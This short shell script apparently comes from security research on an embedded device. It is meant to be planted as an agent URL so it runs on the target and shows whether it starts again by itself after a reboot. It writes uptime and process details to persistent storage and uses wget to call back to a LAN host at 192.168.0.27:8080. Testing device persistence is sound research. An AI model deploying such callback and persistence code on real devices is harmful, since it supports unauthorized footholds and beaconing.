#!/bin/sh
# Boot detection script - writes timestamp to misc_rw and sends callback
# This script is designed to be the Lifemote agent URL
# If it runs after reboot WITHOUT external trigger, it proves auto-start
trap '' 1
export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/sbin
BB=/bin/busybox
BASE="http://192.168.0.27:8080"

# Write boot detection marker to persistent storage
UPTIME=$($BB cat /proc/uptime 2>/dev/null | $BB awk '{print $1}')
NOW=$($BB date 2>/dev/null)

{
echo "BOOT_DETECTED"
echo "uptime=$UPTIME"
echo "date=$NOW"
echo "pid=$$"
echo "ppid=$PPID"
$BB ps 2>/dev/null | $BB grep -E 'phoenix|cos|init' | head -10
} > /var/run/misc/misc_rw/detectic/boot_detected.txt 2>/dev/null

# Also append to autostart log
echo "[${UPTIME}] boot_detection_script ran pid=$$" >> /var/run/misc/misc_rw/detectic/autostart.log 2>/dev/null

# Send callback with uptime info
$BB wget -q -T 5 -O /dev/null "${BASE}/done?status=boot_detected&uptime=${UPTIME}&pid=$$" 2>/dev/null || true

# Exit immediately - this is just a detection script
exit 0
